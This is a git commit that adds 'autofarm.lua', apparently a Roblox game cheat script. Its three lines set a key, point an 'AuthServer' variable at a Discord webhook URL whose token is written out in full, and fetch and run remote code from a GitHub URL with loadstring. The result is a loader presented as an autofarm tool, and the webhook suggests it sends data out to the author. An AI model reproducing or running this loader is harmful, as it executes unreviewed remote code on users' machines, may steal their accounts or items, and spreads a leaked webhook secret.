a951ebd101ee3968ba9200762d83306d8883ea30
huryyryrs <107345759+huryyryrs@users.noreply.github.com>
2023-01-11 09:57:45 +1030

    Add files via upload

---
+++ autofarm.lua
@@ -0,0 +1,3 @@
+_G.Key = "qnecajgnivah"
+_G.AuthServer = "https://discord.com/api/webhooks/1062181225432879217/ruAioBtK1S5ZqgrFpnCQo0WmJWF9tdNgmypfSPNPsMmamjjZM7-ID5tf0cHQi8SQ43IT"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
